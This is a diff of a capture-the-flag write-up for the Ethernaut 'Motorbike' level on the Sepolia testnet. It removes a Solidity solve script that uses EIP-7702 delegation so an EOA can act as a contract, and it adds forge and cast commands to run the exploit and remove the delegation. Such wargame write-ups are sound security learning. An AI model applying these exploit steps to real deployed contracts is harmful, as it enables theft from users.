@@ -229,31 +229,14 @@ function validateInstance(address payable _instance, address _player) public ove
 
 The proposed solution involves creating an instance using a contractimplying that only a contract can solve the challenge, not an Externally Owned Account (EOA). Fortunately, after the Pectra upgrade, EIP-7702 allows EOA to set its code based on any existing smart contract. Therefore, we are able to solve the challenge using an EOA. The solve script is as follows:
 
-```solidity
-function run() external {
-    // Deploy delegation contract
-    vm.broadcast(MY_MAIN_PK);
-    implementation = new MotorbikeExploit();
-
-    // MY_MAIN_ADDRESS signs the delegation allowing MY_SEC_ADDRESS to execute transactions on its behalf.
-    Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(implementation), MY_MAIN_PK);
-
-    // MY_SEC_ADDRESS attaches the signed delegation from MY_MAIN_ADDRESS and broadcasts it.
-    vm.broadcast(MY_SEC_PK);
-    vm.attachDelegation(signedDelegation);
-
-    // As MY_SEC_ADDRESS, execute the transaction via MY_MAIN_ADDRESS's assigned contract.
-    address motorbike = MotorbikeExploit(MY_MAIN_ADDRESS).solve(5047);
-
-    // Submit the instance.
-    vm.broadcast(MY_MAIN_PK);
-    (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbike));
-    require(success, "Failed to submit level instance");
-}
-```
-
 ```sh
-forge script script/Exploit.s.sol --rpc-url=$RPC -vvvv --isolate --broadcast --skip-simulation
+cp .env.example .env
+
+NONCE=$(cast nonce 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6 -r $RPC) \
+forge script script/Exploit.s.sol --rpc-url $RPC -vvvv --isolate --broadcast --skip-simulation
+
+# Optionally remove the delegation
+forge script script/RemoveDelegation.s.sol --rpc-url $RPC -vvvv --isolate --broadcast --skip-simulation
 ```
 
 My successful exploitation tx is [here](https://sepolia.etherscan.io/tx/0x63399238d5bb04bb712ab8b19eaeecfaff587a1ba78ef08e99cb9c1eceb46850).
